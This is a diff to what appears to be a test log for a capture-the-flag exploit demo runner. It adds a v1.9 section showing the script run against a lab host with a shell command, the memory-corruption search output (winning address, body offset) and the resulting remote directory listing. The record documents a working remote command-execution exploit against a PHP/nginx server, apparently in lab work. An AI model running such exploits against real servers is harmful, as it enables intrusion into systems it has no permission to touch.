@@ -748,6 +748,43 @@ run artifact: artifacts/demo_v1_8_20260515-055639.json
 
 Status: pass. The modular file-read vector was exercised end-to-end, not only by a small read.
 
+## Demo Runner v1.9 Plain Command Output And No-phpinfo Mode
+
+Purpose: verify that command output is copy/paste-friendly terminal text and that `phpinfo()` is optional.
+
+Command:
+
+```bash
+./demo_ctf_exploit_v1_9.py \
+  --host 192.168.1.205 --cmd 'ls -la /app/tmp' \
+  --fast --artifact-dir artifacts --phpinfo-path ''
+```
+
+Observed:
+
+```text
+Routes: phpinfo disabled; HTTP/2 victim on the same listener
+PHP version: not learned
+PHP Server API: not learned
+selected geometry A=127, plus=962 with 60 ranked candidate(s)
+using 60 candidates from the fresh reset core
+winning address: 0x55e4210b2127
+winning body offset: 1376
+run artifact: artifacts/demo_v1_9_20260515-060251.json
+```
+
+Final command output had no frame and no per-line prefixes:
+
+```text
+total 1836
+drwxr-xr-x 2 nobody nogroup    4096 May 15 04:02 .
+drwxr-xr-x 4 root   root       4096 May 14 21:58 ..
+-rw------- 1 nobody nogroup 2531328 May 15 04:02 core
+-rw-r--r-- 1 root   root          5 May 15 03:40 nginx.pid
+```
+
+Status: pass.
+
 ## Demo Artifact Summarizer
 
 Purpose: summarize multiple demo artifacts and surface success/negative-pass status, reset-core PID matches, candidate counts, winning addresses, and command modes.
